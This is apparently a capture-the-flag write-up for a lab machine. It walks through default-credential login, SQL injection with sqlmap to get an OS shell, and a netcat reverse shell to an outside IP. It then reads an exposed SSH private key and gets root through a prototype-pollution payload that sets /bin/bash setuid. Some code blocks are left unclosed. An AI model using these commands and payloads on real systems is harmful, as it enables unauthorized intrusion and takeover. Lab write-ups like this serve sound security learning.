### Exploitation

Only ports 80 and 3306 are open, so first I started checking on HTTP service, there is a login page at first redirect:

![](/assets/img/Pasted-image-20250219212838.png)

I then tried to login using Default Credentials, and I got the pair `admin:admin123`, once inside I started browsing through the interface while capturing my requests using BurpSuite, I did not identify anything like an administrative console, so I research online and found the following blog: [Online Food Ordering System - Multiple Unauthenticated SQL Injections (SQLi) ](https://fluidattacks.com/advisories/hann/).

Basically the application is full of SQLi, so I grabbed one of the captured requests:
```bash
GET /all-orders.php?status=Delivered HTTP/1.1
Host: 10.0.14.39
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

Cookie: PHPSESSID=9e96pm2rkd4qvpflrlo7sbg5r1
Upgrade-Insecure-Requests: 1
```

And saved it as `req1` so I can use `sqlmap` to test for the SQLi:
```bash
sqlmap -r req1 --dbs

sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:

I already know that the application is created with PHP, those apps are mostly vulnerable to a webshell upload through SQLi, so I executed this command to get a non-interactive shell:
```bash
sqlmap -r req1 --os-shell

Now we have a non-interactive shell with sqlmap, then I proceed to get a full interactive shell by running `nc -e /bin/bash 10.10.5.122 1234` command.

### Privilege Escalation

#### ETSCTF

To escalate privileges I ran `linpeas.sh` and the results retrieved this:
```bash
══╣ Possible private SSH keys were found!
/home/ETSCTF/.ssh/id_ed25519

www-data@bunreal:/tmp$ cat /home/ETSCTF/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDxNdFXecbIfNXImPfoR3wiHLwBeIZvEIJZN+PwzmnNZAAAAIjouaTq6Lmk
6gAAAAtzc2gtZWQyNTUxOQAAACDxNdFXecbIfNXImPfoR3wiHLwBeIZvEIJZN+PwzmnNZA

vAF4hm8Qglk34/DOac1kAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----

```

This is the private key for user ETSCTF so I can use it to access the machine via SSH:
```bash
ssh -i id_rsa ETSCTF@10.0.14.39                              
ETSCTF@bunreal:~$
```

#### ROOT

Then once I'm logged in as user ETSCTF I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
ETSCTF@bunreal:~$ sudo -l
Matching Defaults entries for ETSCTF on bunreal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ETSCTF may run the following commands on bunreal:
    (ALL : ALL) NOPASSWD: /usr/local/bin/breal
``` 
This is the content of it:
```bash
ETSCTF@bunreal:~$ cat /usr/local/bin/breal
#!/usr/bin/node
var args = process.argv.slice(2);
const { exec } = require('child_process');

(async () => {
  const lib = await import('@byondreal/accessor');
  var shell = {}
  var property=JSON.parse(args[0]);
  var param=args[1];
  var val=JSON.parse(args[2])
  try {
    lib.default (property,param, val)
  } catch (e) { }
  if(shell.cmd)
  {
    exec(shell.cmd)
  }
```
As usual, the vulnerability relays on the imported library, in this case `@byondreal/accessor`, there is a vulnerability reported as [byondreal/accesor Prototype Pollution](https://gist.github.com/mestrtee/97bc2fbfbcbde3a54d5536c9adeee34c), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
ETSCTF@bunreal:~$ sudo /usr/local/bin/breal '{}' '__proto__.cmd' '"chmod +s /bin/bash"'
ETSCTF@bunreal:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`/proc/1/environ`
`/root`
`/home/ETSCTF`

### Credentials

- Credentials identified are: `admin:admin123`

### Notes

-  It is important to check other user's folders in case there is any interesting information, or, in this case, a private key readable by anyone.
